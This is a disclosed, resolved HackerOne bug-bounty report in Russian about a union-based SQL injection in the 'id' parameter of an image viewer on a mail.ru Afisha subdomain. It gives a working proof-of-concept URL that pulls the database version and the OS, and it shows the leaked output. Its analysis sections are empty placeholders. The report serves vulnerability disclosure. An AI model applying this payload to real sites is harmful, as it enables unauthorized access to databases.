---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '112555'
original_report_id: '112555'
title: '[afisha.mail.ru] SQL Injection'
weakness: SQL Injection
team_handle: mailru
created_at: '2016-01-24T10:08:52.077Z'
disclosed_at: '2016-02-01T20:00:38.269Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 0
tags:
- hackerone
- sql-injection
---

# [afisha.mail.ru] SQL Injection

## Metadata

- HackerOne Report ID: 112555
- Weakness: SQL Injection
- Program: mailru
- Disclosed At: 2016-02-01T20:00:38.269Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Добрый день. Параметр id попадает в SQL запрос без фильтрации. Вектор атаки - Union Based SQLi

PoC

http://mmkf.afisha.mail.ru/imgview.html?id=3713444279+and(0)union(select(concat_ws(0x2c,version(),@@version_compile_os)))

вывод в сорцах страницы - 5.0.92-community-log:unknown-linux-gnu

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
